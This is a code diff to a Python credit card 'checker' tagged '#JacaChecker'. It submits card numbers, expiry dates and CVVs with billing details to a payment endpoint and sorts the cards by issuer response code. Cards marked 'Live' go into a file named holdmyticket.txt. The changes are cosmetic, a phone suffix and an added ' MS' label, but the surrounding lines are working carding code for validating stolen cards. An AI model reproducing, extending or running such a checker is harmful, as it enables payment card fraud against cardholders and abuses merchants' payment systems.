@@ -175,7 +175,7 @@ def checker(card, month, year, cvv):
                                 "state": state,
                                 "zip": postcode,
                                 "country": "US",
-                                "phone": f"{tel}66121",
+                                "phone": f"{tel}00092",
                                 "email": email
                             }
                         },
@@ -202,7 +202,7 @@ def checker(card, month, year, cvv):
                     if 'Retry Transaction' in response.text:
                         code = response.json()['issuerResponseDetails']['issuerResponseCode']
                         bin = api_bin(card[:6])              
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}]"                          
+                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry {code} [{MSegundos}] MS"                          
                         open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry {code} [{MSegundos}] #JacaChecker\n")
                         print(Fore.GREEN + f"Live: {x} #JacaChecker")     
                         return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
@@ -210,7 +210,7 @@ def checker(card, month, year, cvv):
                     elif 'issuerResponseCode":"85"' in response.text:
                         code = response.json()['issuerResponseDetails']['issuerResponseCode']
                         bin = api_bin(card[:6])              
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS {code} [{MSegundos}]"                          
+                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS {code} [{MSegundos}] MS"                          
                         open("holdmyticket.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} AVS {code} [{MSegundos}] #JacaChecker\n") 
                         print(Fore.GREEN + f"{x} #JacaChecker") 
                         return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
@@ -218,7 +218,7 @@ def checker(card, month, year, cvv):
                     elif 'issuerResponseCode":"46"' in response.text:
                         code = response.json()['issuerResponseDetails']['issuerResponseCode']
                         bin = api_bin(card[:6])              
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} [{MSegundos}]"                          
+                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Closed {code} [{MSegundos}] MS"                          
                         print(Fore.RED + f"{x} #JacaChecker")  
                         return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                         
@@ -226,7 +226,7 @@ def checker(card, month, year, cvv):
                     elif 'issuerResponseDetails' in response.text:
                         response = response.json()['issuerResponseDetails']['issuerResponseDescription']
                         bin = api_bin(card[:6])
-                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos}]"     
+                        x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos}] MS"     
                         print(Fore.RED + f"{x} #JacaChecker")  
                         return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                       
 
